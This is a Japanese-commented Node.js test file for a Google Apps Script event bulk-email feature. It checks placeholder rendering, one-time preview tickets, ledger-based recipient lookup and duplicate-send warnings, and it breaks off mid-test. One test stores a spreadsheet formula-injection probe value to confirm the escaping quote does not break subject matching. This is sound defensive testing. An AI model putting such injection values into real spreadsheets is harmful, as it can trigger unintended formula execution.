/**
 * 一斉メール（gas/Broadcast.gs）を、**実際に走らせて**確かめる。
 *
 * ■ なぜ形の検査にしないか
 *   引き継ぎ書 §9「形を見る検査の限界」。ソース文字列を見る検査は
 *   順序の取り違えには効くが、**入力に対する振る舞い**は捕まえられない。
 *   一斉メールで守りたいのは、まさに振る舞いのほう
 *   （誰に届くか・二度届かないか・差し込みが解決できているか）。
 *
 * ■ 代役は src/gasbox.js のものを使う
 *   写しを持つと、片方だけ厳しくしたときにもう片方が緩いまま通る。
 *   2026-09-04 の検証役が見つけた【高】5件は、どれも代役が本物より
 *   優しかったことが原因だった。
 */
const { test, describe } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const GASBOX = require('./_gasbox');

const ROOT = path.resolve(__dirname, '..');
const read = f => fs.readFileSync(path.join(ROOT, f), 'utf8').split('\r\n').join('\n');

const NL = String.fromCharCode(10);

/**
 * gas/Broadcast.gs を、周りの本物ごと箱に読み込む。
 *
 * MailTemplate.gs を**本物のまま**読むのが要点。
 * 差し込みの解決（mailtplRender_）を写しで持つと、
 * 「値が空なら行ごと落とす」規則が二重実装になってズレる。
 */
function makeBox(opts) {
  opts = opts || {};
  const history = [];
  const sentTo = [];
  const sentMail = [];
  const sheets = {};
  /*
   * 起きたことを起きた順に並べる。
   * 「履歴を送信より先に書く」は**順序そのもの**が守りなので、
   * 結果だけを見る検査では確かめられない（後で書いても結果は同じに見える）。
   */
  const ops = [];

  /*
   * シートの見出しは、**本番の定義（BROADCAST_HEAD）をそのまま使う**。
   * ここに見出しの写しを書くと、列を足したときに検査だけが古いまま通り、
   * 本番では列がずれて値が黙って消える（引き継ぎ書 §5「台帳の列の整合」）。
   */
  const sheetFor = name => {
    // setup() を実行する前の状態を作る。本物の sheet_ は
    // 「シートが見つかりません（setup() を実行してください）」を投げる
    if (opts.noHistorySheet && name === '一斉メール履歴') {
      throw new Error('シートが見つかりません: ' + name + '（setup() を実行してください）');
    }
    if (!sheets[name]) {
      const head = name === 'メール文面'
        ? ['種類', '件名', '本文', '更新日時', '更新者']
        : (box.BROADCAST_HEAD || ['送信ID']);
      sheets[name] = GASBOX.makeSheet(head, (opts.logRows || []).map(r => head.map(h => r[h] || '')));
      sheets[name].name = name;
      const append = sheets[name].appendRow;
      sheets[name].appendRow = line => { ops.push('log:' + name); return append(line); };
    }
    return sheets[name];
  };

  /*
   * 「いま」を止められる Date。
   *
   * 24時間の判定を確かめるには、実時刻では書けない
   * （テストを流した時刻によって通ったり落ちたりする検査になる）。
   * 引数ありの呼び出しは本物のまま通す。
   */
  const FixedDate = opts.now ? class extends Date {
    constructor(...a) { if (a.length === 0) super(opts.now.getTime()); else super(...a); }
    static now() { return opts.now.getTime(); }
  } : Date;

  const box = vm.createContext({
    Array, Object, String, Number, JSON, RegExp, Math, isFinite, Error,
    Date: FixedDate,
    console: { error() {}, log() {} },
    Utilities: GASBOX.makeUtilities({ now: opts.now }),
    CacheService: GASBOX.makeCache(opts.clock),
    SpreadsheetApp: { flush() {} },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    MailApp: { getRemainingDailyQuota: () => (opts.quota == null ? 1000 : opts.quota) },
    GmailApp: {
      sendEmail(to, subject, body) {
        ops.push('send:' + to);
        if (opts.failFor && opts.failFor.indexOf(to) >= 0) throw new Error('送信失敗');
        sentTo.push(to);
        sentMail.push({ to: to, subject: subject, body: body });
      },
    },
    // ── プロジェクト側
    LOCK_WAIT_MS: 1000,
    EVENT_NAME: 'テスト祭',
    SHEET: { MAILTPL: 'メール文面', BROADCAST: '一斉メール履歴' },
    sheet_: sheetFor,
    configText: (k, d) => (opts.config && k in opts.config ? opts.config[k] : d),
    appendHistory: (...a) => history.push(a),
    logError_() {},
    mailOptions_: () => ({}),
    signature_: () => '（署名）',
    eventFactsBlock_: () => '（開催概要）',
    confirmDeadlineText_: () => '2026年10月10日まで',
    diagnoseMail: () => ({ aliasRegistered: true, from: 'x@y.z', remainingQuota: 1000 }),
  });

  /*
   * sha256_ と safeEquals_ は gas/Auth.gs の**本物を切り出して**入れる。
   * 代役を書くと、今日いちばんの学び（代役が本物より優しい）を繰り返す。
   * 指紋の検査は、本物のダイジェストでなければ意味を持たない。
   */
  const AUTH = read('gas/Auth.gs');
  vm.runInContext(GASBOX.cutFunction(AUTH, 'sha256_'), box);
  vm.runInContext(GASBOX.cutFunction(AUTH, 'safeEquals_'), box);

  // 台帳の読み方（列の引き方・空行の落とし方）も本物を借りる。
  // ここを写すと「模擬では通るのに本番で落ちる」がまた起きる
  const ADMIN = read('gas/Admin.gs');
  // indexOf_ は列が無ければ例外を投げる。**この厳しさごと**借りるのが要点
  // safeCellText_ は「シートで数式として動く値」を止める。**本物を借りる**
  ['indexOf_', 'liveRows_', 'cell_', 'asText_', 'safeCellText_'].forEach(fn => {
    vm.runInContext(GASBOX.cutFunction(ADMIN, fn), box);
  });
  vm.runInContext(ADMIN.slice(ADMIN.indexOf('var COL = {'),
    ADMIN.indexOf('};', ADMIN.indexOf('var COL = {')) + 2), box);

  vm.runInContext(read('gas/MailTemplate.gs').replace(/^\/\*\*[\s\S]*?\*\/\n/, ''), box);
  vm.runInContext(read('gas/Broadcast.gs').replace(/^\/\*\*[\s\S]*?\*\/\n/, ''), box);

  box.__history = history;
  box.__sentTo = sentTo;
  box.__sentMail = sentMail;
  box.__sheets = sheets;
  box.__ops = ops;
  return box;
}

/**
 * 箱の中の関数を呼んで、**素の値に写して**返す。
 *
 * 引き継ぎ書 §8：`vm.runInContext` の中で作られた配列・オブジェクトは
 * Node のものと別物で、`deepStrictEqual` は中身が同じでも一致しない
 * （`actual: []` と `expected: []` が不一致になる）。実際にここで踏んだ。
 */
function call(box, fn, ...args) {
  return JSON.parse(JSON.stringify(vm.runInContext(fn, box)(...args)));
}

/** 台帳から取った1行ぶんの形（broadcastRows_ が返すもの） */
function row(id, over) {
  return Object.assign({
    id: id,
    company: id + '社',
    shopName: '',
    person: '担当 太郎',
    email: id.toLowerCase() + '@example.com',
    status: '採択',
    block: '',
    inAt: '',
    token: 'a'.repeat(32),
  }, over || {});
}

describe('差し込みの解決（broadcastBuild_）', () => {

  test('本文の差し込みが、その行の値に置き換わる', () => {
    const box = makeBox();
    const built = call(box, 'broadcastBuild_',
      row('SB-0001', { company: '花園商店' }),
      '{{企業名}} さまへ',
      '{{お名前}} 様' + NL + '{{企業名}} の {{受付ID}} です。');

    assert.strictEqual(built.subject, '花園商店 さまへ');
    assert.ok(built.body.indexOf('担当 太郎 様') >= 0, built.body);
    assert.ok(built.body.indexOf('花園商店 の SB-0001 です。') >= 0, built.body);
  });

  test('値が空の差し込みは、その行ごと落ちる（既存の規則をそのまま使う）', () => {
    const box = makeBox();
    const built = call(box, 'broadcastBuild_',
      row('SB-0001', { block: '' }),
      '件名',
      '区画番号：{{区画番号}}' + NL + '本文は残る');

    assert.ok(built.body.indexOf('区画番号') < 0,
      '区画が空なのに「区画番号：」の行が残っています：' + built.body);
    assert.ok(built.body.indexOf('本文は残る') >= 0, built.body);
  });

  /*
   * ■ ここがこの機能の肝
   *   50社ぶんの本文を目で追うことはできないので、
   *   「落ちた行があること」を**機械が数えて画面に出す**必要がある。
   *   落ちたことに気づけないと、区画番号の無い案内が黙って届く。
   */
  test('落ちた差し込みの名前を返す（画面に出すため）', () => {
    const box = makeBox();
    const built = call(box, 'broadcastBuild_',
      row('SB-0001', { block: '', inAt: '9:00' }),
      '件名',
      '区画：{{区画番号}}' + NL + '搬入：{{搬入予定時刻}}');

    assert.deepStrictEqual(built.dropped, ['区画番号'],
      '空になった差し込みの名前を返していません');
  });

  /*
   * ■ 画面を実際に見て見つけた（2026-09-08）
   *
   *   プレビューは「{{搬入予定時刻}} が空の2社では、その行が消えます」と
   *   正しく警告していたのに、**本文では消えていなかった**：
   *
   *       　出店名　　唐揚げキッチン
   *       　区画番号　3
   *       　搬入時刻　          ← 見出しだけが宙に浮いて残る
   *
   *   mailtplRender_ の「値が空なら行ごと落とす」規則は、
   *   `出店名：` のようにコロンで終わる行と記号だけの行しか見ていない。
   *   この案件のメールは**全角スペースで桁を揃える**書き方なので網から漏れた。
   *
   *   `dropped` に名前は正しく入っていたので、**検査は全部通っていた**。
   *   「警告は出る／実際は消えない」は、画面を見るまで分からなかった。
   */
  test('見出しを全角スペースで揃えた行も、値が空なら消える', () => {
    const box = makeBox();
    const built = call(box, 'broadcastBuild_',
      row('SB-0001', { shopName: '唐揚げキッチン', block: '3', inAt: '' }),
      '件名',
      '　出店名　　{{出店名}}' + NL
      + '　区画番号　{{区画番号}}' + NL
      + '　搬入時刻　{{搬入予定時刻}}');

    assert.ok(built.body.indexOf('搬入時刻') < 0,
      '見出しだけが残っています：' + JSON.stringify(built.body));
    assert.ok(built.body.indexOf('　区画番号　3') >= 0, built.body);
    assert.ok(built.body.indexOf('　出店名　　唐揚げキッチン') >= 0, built.body);
  });

  test('値が行の途中にあるときは、行を消さない（消しすぎない）', () => {
    const box = makeBox();
    const built = call(box, 'broadcastBuild_',
      row('SB-0001', { shopName: '' }),
      '件名',
      '{{出店名}} さまのご出店をお待ちしております。');

    assert.ok(built.body.indexOf('さまのご出店をお待ちしております。') >= 0,
      '値の後ろに文が続く行まで消しています：' + JSON.stringify(built.body));
  });

  test('区画番号と搬入予定時刻が差し込める', () => {
    const box = makeBox();
    const built = call(box, 'broadcastBuild_',
      row('SB-0001', { block: '12〜14', inAt: '9:30' }),
      '件名',
      '区画：{{区画番号}} 搬入：{{搬入予定時刻}}');

    assert.ok(built.body.indexOf('区画：12〜14 搬入：9:30') >= 0, built.body);
    assert.deepStrictEqual(built.dropped, []);
  });
});

/*
 * 保存された文面（採択・不採択）には種類ごとの規則があるが、
 * その場で書く文面には当てはめる規則が無い。
 * **当てはめられるものだけを当てる**（設計メモ §5）。
 */
describe('文面の検査（broadcastValidate_）', () => {

  const errs = (subject, body) => call(makeBox(), 'broadcastValidate_', subject, body);

  test('通る文面では何も返さない', () => {
    assert.deepStrictEqual(errs('件名', '{{お名前}} 様' + NL + '本文'), []);
  });

  test('件名が空なら断る', () => {
    assert.ok(errs('', '本文').join('').indexOf('件名') >= 0);
  });

  test('本文が空なら断る', () => {
    assert.ok(errs('件名', '   ').join('').indexOf('本文') >= 0);
  });

  /*
   * `{{担当者}}` と書いても置き換わらず、**そのまま50社に届く**。
   * 保存する文面には既に同じ検査があるが（mailtplValidate_）、
   * その場で書く文面はその経路を通らない。
   */
  test('知らない差し込みを断る', () => {
    const e = errs('件名', '{{担当者}} 様').join('');
    assert.ok(e.indexOf('担当者') >= 0, '知らない差し込みの名前を出していません：' + e);
  });

  /*
   * 採択通知にしか無い差し込みを一斉メールに書いても、値が用意されていない。
   * 「知らない差し込み」と同じ扱いで断る。
   */
  test('一斉メールで使えない差し込みを断る', () => {
    assert.ok(errs('件名', '{{素材アップロードのご案内}}').length > 0);
  });

  /*
   * 閉じ忘れ `{{お名前}` は正規表現に当たらないので、
   * 差し込みとして扱われないまま**そのまま届く**。
   * 「知らない差し込み」の検査では捕まらない別の穴。
   */
  test('括弧の閉じ忘れを断る', () => {
    const e = errs('件名', '{{お名前} 様').join('');
    assert.ok(e.length > 0, '閉じ忘れが素通りしています');
  });

  test('件名が長すぎたら断る', () => {
    assert.ok(errs('あ'.repeat(201), '本文').join('').indexOf('件名') >= 0);
  });

  test('本文が長すぎたら断る', () => {
    assert.ok(errs('件名', 'あ'.repeat(20001)).join('').indexOf('本文') >= 0);
  });

  /*
   * 件名と本文をつないで1つの文字列として検査していたので、
   * **境目をまたいだ差し込み**が「正しい形」に見えて通っていた
   * （2026-09-08、検証役が発見）。
   * 送るときは件名と本文が別々に組み立てられるので、
   * どちらにも `{{` が生のまま残って届く。
   */
  test('件名と本文の境目をまたぐ差し込みを断る', () => {
    const e = errs('件名 {{', 'お名前}} 様').join('');
    assert.ok(e.length > 0, '境目をまたいだ差し込みが素通りしています');
  });

  /* `{{お名前}}}` は余った `}` がそのまま届く（「中村 美咲} 様」） */
  test('余分な閉じ括弧を断る', () => {
    const e = errs('件名', '{{お名前}}} 様').join('');
    assert.ok(e.length > 0, '余った閉じ括弧が素通りしています');
  });

  test('括弧を使っていない普通の文面は通る', () => {
    assert.deepStrictEqual(
      errs('【ご案内】お知らせ', '{{お名前}} 様' + NL + '（※お手数ですが…）'), []);
  });
});

/*
 * ■ 一斉メールに、採択通知のような「送信日時の列」は無い
 *
 *   採択通知は台帳の列そのものが二重送信を止めている。
 *   一斉メールにはそれが無いので、札で止める。
 *
 * ■ 札に指紋を持たせる（設計メモから1つ強くした）
 *
 *   札をただの乱数にすると二重クリックしか止まらない。
 *   **プレビューで見た件名・本文・宛先の指紋**を札に結びつけると、
 *   「画面で見たものしか送れない」まで保証できる。
 */
describe('一度きりの札（broadcastTicket_ / broadcastUseTicket_）', () => {

  const ISSUE = (box, s, b, ids) => vm.runInContext('broadcastTicket_', box)(s, b, ids);
  const USE = (box, t, s, b, ids) => vm.runInContext('broadcastUseTicket_', box)(t, s, b, ids);

  test('発行した札は1回だけ通る', () => {
    const box = makeBox();
    const t = ISSUE(box, '件名', '本文', ['SB-0001', 'SB-0002']);
    assert.strictEqual(USE(box, t, '件名', '本文', ['SB-0001', 'SB-0002']), true);
  });

  test('同じ札は二度使えない（二重クリック・通信の再送）', () => {
    const box = makeBox();
    const t = ISSUE(box, '件名', '本文', ['SB-0001']);
    assert.strictEqual(USE(box, t, '件名', '本文', ['SB-0001']), true);
    assert.strictEqual(USE(box, t, '件名', '本文', ['SB-0001']), false,
      '同じ札で二度送れています');
  });

  test('知らない札では送れない', () => {
    const box = makeBox();
    ISSUE(box, '件名', '本文', ['SB-0001']);
    assert.strictEqual(USE(box, 'でっちあげ', '件名', '本文', ['SB-0001']), false);
  });

  test('件名を書き換えたら、その札では送れない', () => {
    const box = makeBox();
    const t = ISSUE(box, '当日のご案内', '本文', ['SB-0001']);
    assert.strictEqual(USE(box, t, '別の件名', '本文', ['SB-0001']), false,
      'プレビューで見ていない件名が送れています');
  });

  test('宛先を足したら、その札では送れない', () => {
    const box = makeBox();
    const t = ISSUE(box, '件名', '本文', ['SB-0001']);
    assert.strictEqual(USE(box, t, '件名', '本文', ['SB-0001', 'SB-0002']), false,
      'プレビューで見ていない相手に送れています');
  });

  test('宛先の並び順が違うだけなら通る（画面の並べ替えで弾かれない）', () => {
    const box = makeBox();
    const t = ISSUE(box, '件名', '本文', ['SB-0002', 'SB-0001']);
    assert.strictEqual(USE(box, t, '件名', '本文', ['SB-0001', 'SB-0002']), true);
  });

  /*
   * 期限を無視する代役だと、この検査は「消していないのに通る」。
   * gasbox の makeCache は期限を実際に守るので、本物の挙動で確かめられる。
   */
  test('30分を過ぎた札は使えない', () => {
    let t0 = 1000000;
    const box = makeBox({ clock: () => t0 });
    const t = ISSUE(box, '件名', '本文', ['SB-0001']);
    t0 += 31 * 60 * 1000;
    assert.strictEqual(USE(box, t, '件名', '本文', ['SB-0001']), false,
      '古いプレビューのまま送れています');
  });
});

/*
 * ■ 画面から来た値を一切信じない
 *
 *   画面は「受付IDの配列」だけを送る。企業名も宛先も台帳から引き直す。
 *   画面の値を使うと、細工した通信で任意の宛先に送れる
 *   （管理ページは公開URLにあり、守りはサーバー側だけ・引き継ぎ書 §4）。
 */
describe('受付IDで台帳を引き直す（broadcastRows_）', () => {

  const H = ['受付ID', '企業名', '出店名', '担当者氏名', '担当者メール',
             'ステータス', '割当開始区画', '割当区画数', '搬入予定時刻', '素材トークン'];

  /** 台帳の1行 */
  const L = (id, over) => Object.assign({
    '受付ID': id, '企業名': id + '社', '出店名': '', '担当者氏名': '担当 太郎',
    '担当者メール': id.toLowerCase() + '@example.com', 'ステータス': '採択',
    '割当開始区画': '', '割当区画数': '', '搬入予定時刻': '',
    '素材トークン': 'a'.repeat(32),
  }, over || {});

  function pick(rows, ids) {
    const box = makeBox();
    const ledger = { headers: H, rows: rows.map(r => H.map(h => r[h])) };
    return call(box, 'broadcastRows_', ledger, ids);
  }

  test('選んだ受付IDの行だけを返す', () => {
    const r = pick([L('SB-0001'), L('SB-0002'), L('SB-0003')], ['SB-0001', 'SB-0003']);
    assert.deepStrictEqual(r.rows.map(x => x.id), ['SB-0001', 'SB-0003']);
  });

  test('宛先と企業名は台帳から取る（画面の値を使わない）', () => {
    const r = pick([L('SB-0001', { '企業名': '本当の社名',
                                   '担当者メール': 'real@example.com' })], ['SB-0001']);
    assert.strictEqual(r.rows[0].company, '本当の社名');
    assert.strictEqual(r.rows[0].email, 'real@example.com');
  });

  test('台帳に無い受付IDは、送らずに分けて返す', () => {
    const r = pick([L('SB-0001')], ['SB-0001', 'SB-9999']);
    assert.deepStrictEqual(r.rows.map(x => x.id), ['SB-0001']);
    assert.deepStrictEqual(r.missing, ['SB-9999']);
  });

  test('宛先の形が壊れている行は、送らずに分けて返す', () => {
    const r = pick([L('SB-0001', { '担当者メール': 'こわれている' })], ['SB-0001']);
    assert.deepStrictEqual(r.rows, [], '壊れた宛先を送信対象に入れています');
    assert.deepStrictEqual(r.invalid.map(x => x.id), ['SB-0001'],
      '壊れた宛先を分けて返していません');
  });

  /*
   * 辞退・キャンセル・重複（無効）に一斉メールが届くのは、
   * **どんな絞り込みで選んだとしても事故**。絞り込みに使ったかに関わらず見る。
   */
  ['辞退', 'キャンセル', '重複（無効）'].forEach(st => {
    test('ステータスが「' + st + '」の行には送らない', () => {
      const r = pick([L('SB-0001', { 'ステータス': st })], ['SB-0001']);
      assert.deepStrictEqual(r.rows, [], st + ' に送ろうとしています');
      assert.deepStrictEqual(r.blocked.map(x => x.id), ['SB-0001']);
    });
  });

  test('同じ受付IDを2回選んでも、1通ぶんにまとめる', () => {
    const r = pick([L('SB-0001')], ['SB-0001', 'SB-0001']);
    assert.deepStrictEqual(r.rows.map(x => x.id), ['SB-0001'],
      '同じ相手に2通送ろうとしています');
  });

  test('区画は「開始〜終わり」の形にする', () => {
    const r = pick([L('SB-0001', { '割当開始区画': '12', '割当区画数': '3' })], ['SB-0001']);
    assert.strictEqual(r.rows[0].block, '12〜14');
  });

  test('1区画だけなら、範囲にしない', () => {
    const r = pick([L('SB-0001', { '割当開始区画': '7', '割当区画数': '1' })], ['SB-0001']);
    assert.strictEqual(r.rows[0].block, '7');
  });

  test('未割当なら区画は空（差し込みの行が落ちる）', () => {
    const r = pick([L('SB-0001')], ['SB-0001']);
    assert.strictEqual(r.rows[0].block, '');
  });
});

/*
 * ■ 押し間違いと、意図した再送は、機械には区別できない
 *
 *   催促メールの再送は正当な操作なので、機械が止めると人は迂回路を探す
 *   （シートを直接いじる等）。機械が確実に止められるもの（札）と、
 *   人が決めるべきもの（同じ件名の再送）を分ける。
 */
describe('直前の送信との照合（broadcastRecent_）', () => {

  /** 履歴シートに1行入った状態を作る */
  const withLog = (rows, opts) => makeBox(Object.assign({ logRows: rows }, opts || {}));

  const logRow = (over) => Object.assign({
    '送信ID': 'BC-20261007-1',
    '送信日時': '2026-10-07 10:00',
    '送信者': '小谷',
    '件名': '当日のご案内',
    '本文': '本文',
    '対象件数': '2',
    '宛先の受付ID': 'SB-0001,SB-0002',
    '結果': '成功2件',
  }, over || {});

  test('24時間以内に同じ件名を送った相手を返す', () => {
    const box = withLog([logRow()], { now: new Date(2026, 9, 7, 20, 0) });
    const r = call(box, 'broadcastRecent_', '当日のご案内', ['SB-0002', 'SB-0003']);
    assert.deepStrictEqual(r.ids, ['SB-0002'], '同じ件名の再送を見落としています');
    assert.strictEqual(r.sentAt, '2026-10-07 10:00');
  });

  test('24時間を過ぎていれば、報せない', () => {
    const box = withLog([logRow()], { now: new Date(2026, 9, 8, 11, 0) });
    const r = call(box, 'broadcastRecent_', '当日のご案内', ['SB-0001']);
    assert.deepStrictEqual(r.ids, []);
  });

  test('件名が違えば、報せない', () => {
    const box = withLog([logRow()], { now: new Date(2026, 9, 7, 12, 0) });
    const r = call(box, 'broadcastRecent_', '素材のご提出のお願い', ['SB-0001']);
    assert.deepStrictEqual(r.ids, []);
  });

  test('相手が重なっていなければ、報せない', () => {
    const box = withLog([logRow()], { now: new Date(2026, 9, 7, 12, 0) });
    const r = call(box, 'broadcastRecent_', '当日のご案内', ['SB-0009']);
    assert.deepStrictEqual(r.ids, []);
  });

  test('履歴が空でも落ちない', () => {
    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
    const r = call(box, 'broadcastRecent_', '当日のご案内', ['SB-0001']);
    assert.deepStrictEqual(r.ids, []);
  });

  /*
   * ■ 1行で打ち切ってはいけない（2026-09-08、検証役が発見）
   *
   *   一度に送れるのは40社なので、50社の催促は**必ず2回に分かれる**。
   *   そのあと全社を選び直すと、最初に当たった1行（後半のバッチ）しか
   *   報せず、**前半40社には無警告で2通目が届く**。
   */
  test('複数回に分けて送っていても、重なった相手を全部返す', () => {
    const box = withLog([
      logRow({ '送信ID': 'BC-20261007-1', '送信日時': '2026-10-07 10:00',
               '宛先の受付ID': 'SB-0001,SB-0002' }),
      logRow({ '送信ID': 'BC-20261007-2', '送信日時': '2026-10-07 11:00',
               '宛先の受付ID': 'SB-0003' }),
    ], { now: new Date(2026, 9, 7, 12, 0) });

    const r = call(box, 'broadcastRecent_', '当日のご案内',
      ['SB-0001', 'SB-0003', 'SB-0009']);
    assert.deepStrictEqual(r.ids.slice().sort(), ['SB-0001', 'SB-0003'],
      '前のバッチの相手を報せていません：' + JSON.stringify(r));
    // 直近の送信の日時を出す（人が「さっき送ったやつだ」と分かるように）
    assert.strictEqual(r.sentAt, '2026-10-07 11:00');
  });

  /*
   * 数式よけのクォートが付いた件名でも、照合が一致すること。
   * ここがずれると、二重送信の警告が黙って効かなくなる。
   */
  test('数式よけのクォートが付いていても、件名が一致する', () => {
    const box = withLog([logRow({ '件名': "'-1+1" })],
      { now: new Date(2026, 9, 7, 12, 0) });
    const r = call(box, 'broadcastRecent_', '-1+1', ['SB-0001']);
    assert.deepStrictEqual(r.ids, ['SB-0001'],
      'クォート付きの件名を照合できていません：' + JSON.stringify(r));
  });

  /*
   * 見出しを人が短くしただけで、警告が黙って効かなくなっていた
   * （2026-09-08、検証役が発見）。**黙って正常を作らない。**
   */
  test('見出しが壊れていたら、そのことを返す', () => {
    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
    // 見出しを1つ書き換える（人がシートの列名を短くした状態）
    const sh = vm.runInContext('sheet_', box)('一斉メール履歴');
    sh.grid[0][sh.grid[0].indexOf('宛先の受付ID')] = '宛先';
    sh.grid.push(sh.grid[0].map(() => ''));   // 1行でも中身が要る

    const r = call(box, 'broadcastRecent_', '当日のご案内', ['SB-0001']);
    assert.strictEqual(r.headBroken, true,
      '見出しが壊れているのに、黙って「重なりなし」と答えています');
  });
});

/*
 * ■ 下書きは、配ってしまうと直せない
 *
 *   雛形に知らない差し込みが1つ混ざっていると、
 *   押した人は気づかないまま50社へ {{…}} のまま送ろうとする。
 *   **自分の検査を自分で通ること**を、出荷前に確かめる。
 */
describe('下書き（BROADCAST_DRAFTS_）', () => {

  const drafts = () => call(makeBox(), 'BROADCAST_DRAFTS_');

  test('下書きがある', () => {
    assert.ok(drafts().length >= 2, '下書きが足りません');
  });

  test('どの下書きにも、名前・件名・本文がある', () => {
    drafts().forEach(d => {
      assert.ok(d.name, JSON.stringify(d));
      assert.ok(d.subject, d.name + ' の件名が空です');
      assert.ok(d.body, d.name + ' の本文が空です');
    });
  });

  /*
   * ここが肝。下書きが自分の検査に落ちる状態で出荷すると、
   * 「押したのに送れない」画面になる。
   */
  test('すべての下書きが、そのまま送れる（自分の検査を通る）', () => {
    const box = makeBox();
    call(box, 'BROADCAST_DRAFTS_').forEach(d => {
      const errs = call(box, 'broadcastValidate_', d.subject, d.body);
      assert.deepStrictEqual(errs, [],
        d.name + ' が検査に落ちます：' + errs.join(' / '));
    });
  });

  test('下書きの名前が重複していない（画面の選択肢になる）', () => {
    const names = drafts().map(d => d.name);
    assert.strictEqual(new Set(names).size, names.length, names.join(' / '));
  });
});

/*
 * ■ ここから先は取り消せない
 *
 *   守りを1つずつ、別々の検査にする。まとめて1本にすると、
 *   1つ落ちたときに「どの守りが効かなくなったか」が分からない。
 */
describe('送信（adminBroadcastSend_）', () => {

  const LH = ['受付ID', '企業名', '出店名', '担当者氏名', '担当者メール',
              'ステータス', '割当開始区画', '割当区画数', '搬入予定時刻', '素材トークン'];

  const L = (id, over) => Object.assign({
    '受付ID': id, '企業名': id + '社', '出店名': '', '担当者氏名': '担当 太郎',
    '担当者メール': id.toLowerCase() + '@example.com', 'ステータス': '採択',
    '割当開始区画': '', '割当区画数': '', '搬入予定時刻': '',
    '素材トークン': 'a'.repeat(32),
  }, over || {});

  /**
   * プレビュー → 送信 を通しで走らせる。
   * **札は本物のプレビューから受け取る**（検査のためにでっちあげない）。
   */
  function run(rows, ids, over, opts) {
    opts = opts || {};
    const box = makeBox(Object.assign({ now: new Date(2026, 9, 7, 12, 0) }, opts));
    const ledger = { headers: LH, rows: rows.map(r => LH.map(h => r[h])) };
    box.readLedger_ = () => ledger;

    const subject = opts.subject || '当日のご案内';
    const body = opts.body || '{{お名前}} 様' + NL + 'よろしくお願いいたします。';

    const pre = call(box, 'adminBroadcastPreview_',
      { person: '小谷', role: '管理者' }, { ids: ids, subject: subject, body: body });

    // プレビューのあとに台帳が変わる状況を作れるようにする
    if (opts.mutate) opts.mutate(ledger);

    const payload = Object.assign({
      confirm: true, ids: ids, subject: subject, body: body, ticket: pre.ticket,
    }, over || {});
    const res = call(box, 'adminBroadcastSend_', { person: '小谷', role: '管理者' }, payload);
    return { pre, res, box };
  }

  test('選んだ相手に送れて、履歴が残る', () => {
    const r = run([L('SB-0001'), L('SB-0002'), L('SB-0003')], ['SB-0001', 'SB-0003']);
    assert.strictEqual(r.res.ok, true, JSON.stringify(r.res));
    assert.deepStrictEqual(r.box.__sentTo, ['sb-0001@example.com', 'sb-0003@example.com']);
    const log = r.box.__sheets['一斉メール履歴'].grid;
    assert.strictEqual(log.length, 2, '履歴が1行残っていません');
    assert.strictEqual(log[1][log[0].indexOf('件名')], '当日のご案内');
    assert.strictEqual(log[1][log[0].indexOf('宛先の受付ID')], 'SB-0001,SB-0003');
  });

  /*
   * 送ったのに記録が無い、が起きるといちばん困る
   * （問い合わせに答えられない・二重送信の照合もできない）。
   * 順序そのものが守りなので、起きた順を見る。
   */
  test('履歴を、1通も送る前に書く', () => {
    const r = run([L('SB-0001')], ['SB-0001']);
    assert.strictEqual(r.box.__ops[0], 'log:一斉メール履歴',
      '送信より先に履歴を書いていません：' + r.box.__ops.join(' → '));
  });

  test('確認が無ければ1通も送らない', () => {
    const r = run([L('SB-0001')], ['SB-0001'], { confirm: false });
    assert.deepStrictEqual(r.box.__sentTo, [], '確認が無いのに送っています');
    assert.strictEqual(r.res.error, 'not_confirmed');
  });

  test('札が無ければ1通も送らない', () => {
    const r = run([L('SB-0001')], ['SB-0001'], { ticket: '' });
    assert.strictEqual(r.res.ok, false);
    assert.deepStrictEqual(r.box.__sentTo, []);
  });

  test('同じ札で二度目は送らない（二重クリック）', () => {
    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
    const ledger = { headers: LH, rows: [L('SB-0001')].map(r => LH.map(h => r[h])) };
    box.readLedger_ = () => ledger;
    const pre = call(box, 'adminBroadcastPreview_', { person: '小谷', role: '管理者' },
      { ids: ['SB-0001'], subject: '件名', body: '本文' });
    const p = { confirm: true, ids: ['SB-0001'], subject: '件名', body: '本文',
                ticket: pre.ticket };
    const a = call(box, 'adminBroadcastSend_', { person: '小谷' }, p);
    const b = call(box, 'adminBroadcastSend_', { person: '小谷' }, p);
    assert.strictEqual(a.ok, true, JSON.stringify(a));
    assert.strictEqual(b.ok, false, '同じ札で2通目が送れています');
    assert.strictEqual(box.__sentTo.length, 1, '同じ人に2通届いています');
  });

  test('プレビューのあとに本文を書き換えたら送らない', () => {
    const r = run([L('SB-0001')], ['SB-0001'], { body: 'すり替えた本文' });
    assert.strictEqual(r.res.ok, false, '画面で見ていない本文が送れています');
    assert.deepStrictEqual(r.box.__sentTo, []);
  });

  test('プレビューのあとに宛先を足したら送らない', () => {
    const r = run([L('SB-0001'), L('SB-0002')], ['SB-0001'],
      { ids: ['SB-0001', 'SB-0002'] });
    assert.strictEqual(r.res.ok, false, '画面で見ていない相手に送れています');
    assert.deepStrictEqual(r.box.__sentTo, []);
  });

  /*
   * 札は「画面に出したもの」を縛るが、**台帳のほうが変わる**ことは縛れない。
   * プレビューのあとに辞退へ変わった行に「当日のご案内」が届くのが、
   * いちばん起きやすくて、いちばんまずい形。
   */
  test('プレビューのあとに辞退へ変わっていたら、1通も送らない', () => {
    const r = run([L('SB-0001'), L('SB-0002')], ['SB-0001', 'SB-0002'], null, {
      mutate: ledger => { ledger.rows[1][LH.indexOf('ステータス')] = '辞退'; },
    });
    /*
     * ■ 守りは二重にかかっている（壊し検査で分かったこと）
     *   送信を実際に止めているのは**札**——辞退した行が対象から外れると
     *   送り先の集合が変わり、指紋が合わなくなる。
     *   `lost.length` の検知を丸ごと消しても、1通も出ない。
     *
     *   ではこの検知は何のためか。**人に分かる言葉で伝えるため**。
     *   札だけだと「プレビューで確認したものと違います」としか言えず、
     *   押した人は何が起きたのか分からない。
     *   だからここでは「送られていないこと」と「理由が伝わること」を
     *   別々に見る。
     */
    assert.deepStrictEqual(r.box.__sentTo, [], '辞退した会社に送っています');
    assert.strictEqual(r.res.ok, false, JSON.stringify(r.res));
    assert.strictEqual(r.res.error, 'changed',
      '台帳が変わったことを「対象が変わりました」として伝えていません（いま：'
      + r.res.error + '）');
